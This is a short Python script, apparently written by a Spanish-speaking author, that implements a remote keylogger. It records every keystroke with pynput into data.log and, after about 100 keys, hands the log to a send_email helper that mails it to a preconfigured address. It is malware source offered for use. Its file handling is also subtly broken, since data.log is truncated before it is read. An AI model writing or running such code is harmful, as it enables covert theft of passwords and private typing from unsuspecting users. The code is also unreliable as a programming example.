'''
Keylogger remoto, es decir, se envía el archivo en el que esté lo que se escribe por teclado a un email
previamente configurado.
'''

# IMPORTS
from pynput import keyboard # importación de librería para control de dispositivos de entrada
import send_email # archivo de apoyo con la configuración del email

# FUNCTIONS
# control del archivo data.log y su contenido ----------------------------------------------------------
def get_keys_rb():
    with open('data.log', 'rb') as file:
        text = file.read()
        file.close()
    return text

def get_keys():
    with open('data.log', 'r') as file:
        text = file.read()
        file.close()
    return text

# añadir contenido al archivo data.log ----------------------------------------------------------------
def add_key(key:str): # añadiendo la info
    with open('data.log', 'w') as file:
        keys = get_keys()
        with open('data.log', 'w') as file:
            file.write(f'{keys}{key} ')
            file.close()
def on_press(key):
    try:
        key_name = key.char
    except:
        key_name = key.name

    add_key(key_name)
    return False

# definición del método principal ---------------------------------------------------------------------
def main():
    with open('data.log', 'w') as file:
        file.write(' ')
    while True:
        length = len(get_keys().split(' '))
        if length < 100:
            listener = keyboard.Listener(on_press = on_press)
            listener.start()
            listener.join()
        else:
            send_email.send_email()

# MAIN
if __name__ == '__main__':
    main()